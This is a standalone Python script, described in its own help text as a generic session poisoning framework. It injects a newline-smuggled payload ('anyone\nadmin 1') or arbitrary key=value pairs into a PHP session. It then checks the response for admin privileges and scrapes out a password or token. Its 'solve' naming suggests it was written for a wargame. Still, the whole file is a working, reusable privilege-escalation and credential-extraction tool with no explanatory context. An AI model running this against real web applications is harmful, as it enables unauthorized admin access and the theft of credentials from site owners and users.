#!/usr/bin/env python3
import argparse
import requests
import re
import sys


def extract_password(html: str):
    m = re.search(r"Password:\s*([A-Za-z0-9]+)", html)
    if m:
        return m.group(1)

    m = re.search(r"password.*?<b>([^<]+)</b>", html, re.IGNORECASE)
    if m:
        return m.group(1)

    return None


def solve_single_host(session, args):
    session.get(args.inject_url, timeout=args.timeout)
    payload = {args.param: args.payload}
    session.post(args.inject_url, data=payload, timeout=args.timeout)
    r = session.get(args.read_url, timeout=args.timeout)
    return r.text


def solve_cross_host(session, args):
    session.get(args.inject_url, timeout=args.timeout)

    sid = session.cookies.get(args.cookie_name)
    if not sid:
        print(f"[-] No {args.cookie_name} cookie received from inject URL")
        sys.exit(1)

    payload = {}
    if args.require_submit:
        payload[args.submit_key] = args.submit_value

    for kv in args.kv:
        k, v = kv.split("=", 1)
        payload[k] = v

    session.post(args.inject_url, data=payload, timeout=args.timeout)

    r = session.get(
        args.read_url,
        cookies={args.cookie_name: sid},
        timeout=args.timeout
    )

    return r.text


def main():
    p = argparse.ArgumentParser(description="Generic session poisoning framework")

    p.add_argument("--mode", choices=["single-host", "cross-host"], required=True)

    p.add_argument("--inject-url", required=True, help="URL where the session is created and poisoned")
    p.add_argument("--read-url", required=True, help="URL where poisoned session is evaluated")

    p.add_argument("--user", required=True, help="HTTP Basic Auth username")
    p.add_argument("--password", required=True, help="HTTP Basic Auth password")

    p.add_argument("--cookie-name", default="PHPSESSID", help="Session cookie name (default: PHPSESSID)")

    p.add_argument("--param", default="name", help="Parameter name to poison (single-host mode)")
    p.add_argument("--payload", default="anyone\nadmin 1",
                   help="Payload value for the parameter (single-host mode)")

    p.add_argument("--kv", action="append",
                   help="Key=value pair to inject into the session (cross-host mode)")
    p.add_argument("--require-submit", action="store_true",
                   help="Include a submit-style trigger parameter")
    p.add_argument("--submit-key", default="submit", help="Key name for submit parameter")
    p.add_argument("--submit-value", default="1", help="Value for submit parameter")

    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--verbose", action="store_true")

    args = p.parse_args()

    session = requests.Session()
    session.auth = (args.user, args.password)

    if args.mode == "single-host":
        html = solve_single_host(session, args)

    elif args.mode == "cross-host":
        if not args.kv:
            print("[-] cross-host mode requires at least one --kv argument (e.g. --kv admin=1)")
            sys.exit(1)
        html = solve_cross_host(session, args)

    else:
        print("[-] Invalid mode")
        sys.exit(1)

    if args.verbose:
        print("\n--- FULL RESPONSE ---\n")
        print(html)

    if "You are an admin" in html or "admin" in html.lower():
        print("[+] Privileged session detected")

        pw = extract_password(html)
        if pw:
            print(f"[+] Extracted password/token: {pw}")
        else:
            print("[!] Could not automatically extract password/token")
    else:
        print("[-] Privileged session not detected")


if __name__ == "__main__":
    main()
